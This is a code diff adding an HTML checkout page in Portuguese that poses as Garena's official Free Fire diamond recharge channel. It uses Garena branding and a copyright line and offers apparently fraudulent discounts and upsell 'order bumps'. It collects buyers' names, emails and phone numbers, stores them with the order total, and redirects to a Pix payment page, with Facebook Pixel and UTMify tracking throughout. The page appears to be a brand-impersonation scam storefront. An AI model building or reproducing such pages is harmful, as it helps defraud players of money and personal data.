@@ -1,0 +1,359 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+<!-- Pixel do Facebook -->
+<script>
+  !function(f,b,e,v,n,t,s)
+  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+  n.queue=[];t=b.createElement(e);t.async=!0;
+  t.src=v;s=b.getElementsByTagName(e)[0];
+  s.parentNode.insertBefore(t,s)}(window, document,'script',
+  'https://connect.facebook.net/en_US/fbevents.js');
+  fbq('init', '687601267581599');
+  fbq('track', 'PageView');
+</script>
+<noscript>
+  <img height="1" width="1" style="display:none" 
+       src="https://www.facebook.com/tr?id=687601267581599&ev=PageView&noscript=1"/>
+</noscript>
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Canal Oficial de Recarga - Free Fire</title>
+<meta name="description" content="Recarga oficial de diamantes Free Fire com segurança e promoção especial. Pague via Pix e receba instantaneamente.">
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+<script src="js/qrious.min.js"></script>
+
+<!-- Captura CID da UTMify -->
+<script src="https://cdn.utmify.com.br/scripts/utms/latest.js" async defer></script>
+<script>
+(function esperarUTMify(){
+    const check = () => {
+        try {
+            if (window.__utmify && window.__utmify.cid) {
+                localStorage.setItem('utmify_cid', window.__utmify.cid);
+                console.log('✅ CID salvo:', window.__utmify.cid);
+                return true;
+            }
+        } catch(e){}
+        return false;
+    }
+    let tentativas = 0;
+    const intervalo = setInterval(() => {
+        tentativas++;
+        if (check() || tentativas >= 20) clearInterval(intervalo);
+    }, 300);
+})();
+</script>
+
+<style>
+* { box-sizing: border-box; }
+body { margin: 0; font-family: 'Roboto', sans-serif; background-color: #f5f5f5; color: #323232; }
+header { display: flex; align-items: center; padding: 10px 20px; background-color: white; border-bottom: 1px solid #ddd; }
+.logo-container { display: flex; align-items: center; }
+.logo-container img { height: 40px; margin-right: 8px; }
+.separator { width: 1px; height: 40px; background: #ddd; margin-right: 15px; }
+.title-text { font-size: 16px; line-height: 1.2; }
+.banner-freefire { position: relative; width: 100%; height: 150px; background: url('images/fundo.jpg') center/cover no-repeat; }
+@media (max-width: 600px) { .banner-freefire { height: 100px; } }
+.btn-voltar { position: absolute; top: 15px; left: 15px; background: rgba(0,0,0,0.6); color: white; border: none; padding: 8px 15px; font-size: 16px; border-radius: 20px; cursor: pointer; display: flex; align-items: center; text-decoration: none; }
+.btn-voltar::before { content: '<'; margin-right: 8px; font-size: 18px; }
+.icon-center { position: absolute; bottom: -40px; left: 50%; transform: translateX(-50%); background: white; border-radius: 20px; padding: 5px; box-shadow: 0 0 5px rgba(0,0,0,0.2); }
+.icon-center img { width: 80px; height: 80px; border-radius: 16px; }
+.section-info { background: #ffffff; max-width: 400px; width: 90%; margin: 0 auto; border-radius: 0 0 8px 8px; box-shadow: 0 0 10px rgba(0,0,0,0.05); padding: 80px 20px 20px 20px; margin-top: -40px; font-size: 15px; }
+.row { display: flex; justify-content: space-between; align-items: center; margin: 6px 0; }
+.price-block { background: #f9f9f9; border: 1px solid #eee; padding: 10px; border-radius: 8px; margin: 10px 0; font-size: 14px; }
+.login-section { background: white; max-width: 400px; width: 90%; margin: 20px auto; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); padding: 20px; }
+.login-section label { font-size: 14px; margin-bottom: 5px; display: block; color: #323232; }
+form input { width: 100%; padding: 10px; margin-bottom: 10px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px; color: #323232; }
+form input::placeholder { color: #c9c9c9; }
+form button { width: 100%; background: #d60000; color: white; border: none; padding: 12px; font-size: 18px; font-weight: 700; border-radius: 6px; cursor: pointer; margin-bottom: 25px; }
+footer { text-align: center; font-size: 12px; color: #999; padding: 20px; }
+footer p { margin: 4px 0; }
+#popup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); justify-content: center; align-items: center; z-index: 9999; }
+.popup-content { background: #fff; max-width: 360px; width: 90%; border-radius: 10px; padding: 20px; text-align: center; position: relative; max-height: 90vh; overflow-y: auto; }
+.popup-content h2 { font-size: 18px; margin-bottom: 15px; color: #323232; }
+.order-bump { display: flex; align-items: center; background: #fff; border: 1px solid #ddd; border-radius: 8px; padding: 10px; margin-bottom: 10px; cursor: pointer; transition: border 0.2s; }
+.order-bump.selected { border: 2px solid #d60000; }
+.order-bump input[type="checkbox"] { width: 18px; height: 18px; accent-color: #d60000; cursor: pointer; margin-right: 20px; }
+.order-bump img { width: 50px; height: 50px; border-radius: 6px; object-fit: cover; }
+.order-bump .details { flex: 1; text-align: left; margin-left: 10px; }
+.order-bump .details .name { font-size: 14px; font-weight: 500; color: #1c1c1c; }
+.order-bump .details .prices { font-size: 13px; margin-top: 2px; }
+.order-bump .details .prices .old-price { text-decoration: line-through; color: #999; margin-right: 5px; }
+.order-bump .details .prices .new-price { color: #f59e0b; font-weight: 500; }
+.total-display { display: flex; justify-content: space-between; align-items: center; font-size: 16px; font-weight: 500; margin: 15px 0 5px; }
+.total-display .old-price { text-decoration: line-through; color: #999; margin-right: 8px; font-size: 14px; display: none; }
+.total-display .new-price { color: #f59e0b; font-weight: 500; font-size: 16px; }
+.popup-content button { background: #d60000; color: #fff; border: none; padding: 12px 20px; border-radius: 6px; font-size: 16px; cursor: pointer; width: 100%; margin-top: 10px; }
+</style>
+
+</head>
+<body>
+
+<header>
+    <div class="logo-container">
+        <div style="text-align:center;">
+            <img src="images/logo.png" alt="Garena Logo" loading="lazy">
+        </div>
+        <div class="separator"></div>
+        <div class="title-text">Canal Oficial de<br>Recarga</div>
+    </div>
+</header>
+
+<div class="banner-freefire">
+    <a href="#" class="btn-voltar" aria-label="Voltar para a página anterior">Voltar</a>
+    <div class="icon-center">
+        <img src="images/icon.png" alt="Free Fire" loading="lazy">
+    </div>
+</div>
+
+<section class="section-info">
+    <div class="row"><span>Total</span><span>💎 <strong>6.720</strong></span></div>
+    <div class="price-block">
+        <div class="row"><span>Preço Original</span><span>💎 5.600</span></div>
+        <div class="row"><span>+ Bônus Geral</span><span>💎 1.120</span></div>
+    </div>
+    <p style="font-size:12px; color:#555;">Os diamantes são válidos apenas para a região do Brasil e serão creditados diretamente na conta de jogo.</p>
+    <div class="row"><span>Preço</span><span><strong>R$ 19,97</strong></span></div>
+    <div class="row"><span>Método de pagamento</span><span><strong>Pix</strong></span></div>
+
+    <div id="pix-display" style="display:none; text-align:center; margin-top:20px;">
+        <canvas id="pix-qrcode" style="margin-bottom:10px;"></canvas>
+        <br>
+        <button id="copiar-pix" style="background:#d60000;color:#fff;border:none;padding:10px 20px;border-radius:6px;font-size:16px;cursor:pointer;">Copiar Chave Pix</button>
+    </div>
+</section>
+
+<section class="login-section">
+    <form id="form">
+        <label for="nome">Nome</label>
+        <input type="text" id="nome" placeholder="Nome completo" required="">
+        <label for="email">E-mail</label>
+        <input type="email" id="email" placeholder="E-mail" required="">
+        <label for="telefone">Telefone</label>
+        <input type="tel" id="telefone" placeholder="Seu Número de Telefone" maxlength="15" required="">
+        <p style="font-size: 12px; color: #555;">Ao clicar em “Prosseguir para Pagamento”, atesto que li e concordo com os termos de uso e com a política de privacidade do PagSeguro.</p>
+        <button type="submit">Prosseguir para Pagamento</button>
+    </form>
+</section>
+
+<footer>
+    <p>© Garena Online. Todos os direitos reservados.</p>
+    <p>FAQ � | � Central de Ajuda � | � Termos e condições</p>
+    <p>Política de privacidade</p>
+</footer>
+
+<div id="popup" aria-label="Popup de oferta">
+    <div class="popup-content" id="popupContent">
+        <h2>Promoção de 8 Anos</h2>
+
+        <div class="order-bump" data-price="16.89" data-fullprice="99.99">
+            <input type="checkbox">
+            <img src="images/up1.jpg" alt="Calça Angelical Azul">
+            <div class="details">
+                <div class="name">Calça Angelical Azul</div>
+                <div class="prices"><span class="old-price">R$ 99,99</span><span class="new-price">R$ 16,89</span></div>
+            </div>
+        </div>
+        <div class="order-bump" data-price="15.97" data-fullprice="87.99">
+            <input type="checkbox">
+            <img src="images/up2.jpg" alt="2180 Diamantes Desconto">
+            <div class="details">
+                <div class="name">2180 Diamantes Desconto</div>
+                <div class="prices"><span class="old-price">R$ 87,99</span><span class="new-price">R$ 15,97</span></div>
+            </div>
+        </div>
+        <div class="order-bump" data-price="14.90" data-fullprice="17.99">
+            <input type="checkbox">
+            <img src="images/up3.jpg" alt="Conjunto Coelhão">
+            <div class="details">
+                <div class="name">Conjunto Coelhão</div>
+                <div class="prices"><span class="old-price">R$ 17,99</span><span class="new-price">R$ 14,90</span></div>
+            </div>
+        </div>
+        <div class="order-bump" data-price="12.97" data-fullprice="74.99">
+            <input type="checkbox">
+            <img src="images/up4.jpg" alt="Conjunto Guardião Lendário">
+            <div class="details">
+                <div class="name">Conjunto Guardião Lendário</div>
+                <div class="prices"><span class="old-price">R$ 74,99</span><span class="new-price">R$ 12,97</span></div>
+            </div>
+        </div>
+        <div class="order-bump" data-price="9.90" data-fullprice="97.99">
+            <input type="checkbox">
+            <img src="images/up5.jpg" alt="Máscara Antiga Barba do Velho">
+            <div class="details">
+                <div class="name">Máscara Antiga Barba do Velho</div>
+                <div class="prices"><span class="old-price">R$ 97,99</span><span class="new-price">R$ 9,90</span></div>
+            </div>
+        </div>
+
+        <div class="total-display">
+            <span>Total:</span>
+            <span>
+                <span id="valor-cheio" class="old-price">R$ 19,97</span>
+                <span id="valor-final" class="new-price">R$ 19,97</span>
+            </span>
+        </div>
+
+        <button id="finalizar">Finalizar Pedido</button>
+    </div>
+</div>
+
+<script>
+const telefoneInput = document.getElementById('telefone');
+telefoneInput.addEventListener('input', function(e) {
+    let x = e.target.value.replace(/\D/g, '').slice(0, 11);
+    if (x.length > 0) x = '(' + x;
+    if (x.length > 3) x = x.slice(0, 3) + ') ' + x.slice(3);
+    if (x.length > 10) x = x.slice(0, 10) + '-' + x.slice(10);
+    e.target.value = x;
+});
+
+const popup = document.getElementById('popup');
+document.getElementById('form').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    fbq('track', 'InitiateCheckout', {
+        content_name: 'Recarga Free Fire',
+        currency: 'BRL',
+        value: basePrice
+    });
+
+    popup.style.display = 'flex';
+});
+
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape' && popup.style.display === 'flex') {
+        popup.style.display = 'none';
+    }
+});
+
+popup.addEventListener('click', function(e) {
+    if (e.target === popup) {
+        popup.style.display = 'none';
+    }
+});
+
+const basePrice = 19.97;
+const baseFullPrice = 19.97;
+const valorCheio = document.getElementById('valor-cheio');
+const valorFinal = document.getElementById('valor-final');
+const priceFinalMain = document.querySelector('.section-info .row span strong');
+const bumps = document.querySelectorAll('.order-bump');
+
+function updateTotal() {
+    let total = basePrice;
+    let fullTotal = baseFullPrice;
+    let hasUpsell = false;
+
+    bumps.forEach(bump => {
+        const checkbox = bump.querySelector('input');
+        const price = parseFloat(bump.dataset.price);
+        const fullprice = parseFloat(bump.dataset.fullprice);
+        if (checkbox.checked) {
+            total += price;
+            fullTotal += fullprice;
+            hasUpsell = true;
+        }
+    });
+
+    valorFinal.textContent = 'R$ ' + total.toFixed(2).replace('.', ',');
+    if (hasUpsell) {
+        valorCheio.style.display = 'inline';
+        valorCheio.textContent = 'R$ ' + fullTotal.toFixed(2).replace('.', ',');
+    } else {
+        valorCheio.style.display = 'none';
+    }
+    // Atualiza o valor na tela principal
+    if (priceFinalMain) {
+        priceFinalMain.textContent = 'R$ ' + total.toFixed(2).replace('.', ',');
+    }
+}
+
+bumps.forEach(bump => {
+    bump.addEventListener('click', function(e) {
+        if (e.target.tagName.toLowerCase() !== 'input') {
+            const checkbox = bump.querySelector('input');
+            checkbox.checked = !checkbox.checked;
+        }
+        bump.classList.toggle('selected', bump.querySelector('input').checked);
+        updateTotal();
+    });
+});
+
+// ARMAZENAMENTO E REDIRECIONAMENTO
+document.getElementById('finalizar').addEventListener('click', function() {
+    const nome = document.getElementById('nome').value.trim();
+    const email = document.getElementById('email').value.trim();
+    const telefone = document.getElementById('telefone').value.trim();
+
+    let orderBumps = [];
+    let total = basePrice;
+
+    bumps.forEach(bump => {
+        const checkbox = bump.querySelector('input');
+        if (checkbox.checked) {
+            const name = bump.querySelector('.name').innerText;
+            const price = parseFloat(bump.dataset.price);
+            orderBumps.push({ name, price });
+            total += price;
+        }
+    });
+
+    localStorage.setItem('checkout_nome', nome);
+    localStorage.setItem('checkout_email', email);
+    localStorage.setItem('checkout_telefone', telefone);
+    localStorage.setItem('checkout_orderBumps', JSON.stringify(orderBumps));
+    localStorage.setItem('checkout_total', total.toFixed(2));
+
+    window.location.href = "pay.html" + window.location.search;
+});
+
+updateTotal();
+</script>
+<script>
+(function salvarUTMs() {
+  const params = new URLSearchParams(window.location.search);
+  const utms = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term'];
+  utms.forEach(utm => {
+    const valor = params.get(utm);
+    if (valor) {
+      localStorage.setItem(utm, valor);
+      console.log(`[UTM] ${utm} salvo:`, valor);
+    }
+  });
+})();
+</script>
+
+<!-- UTMify Script -->
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+<!-- UTMify + CID -->
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>
+(function esperarUTMify() {
+  const check = () => {
+    try {
+      if (window.__utmify && window.__utmify.cid) {
+        localStorage.setItem("utmify_cid", window.__utmify.cid);
+        console.log("✅ CID salvo:", window.__utmify.cid);
+        return true;
+      }
+    } catch (e) {}
+    return false;
+  };
+
+  let tentativas = 0;
+  const intervalo = setInterval(() => {
+    tentativas++;
+    if (check() || tentativas >= 20) clearInterval(intervalo);
+  }, 300);
+})();
+</script>
+
+
+
+</body></html>
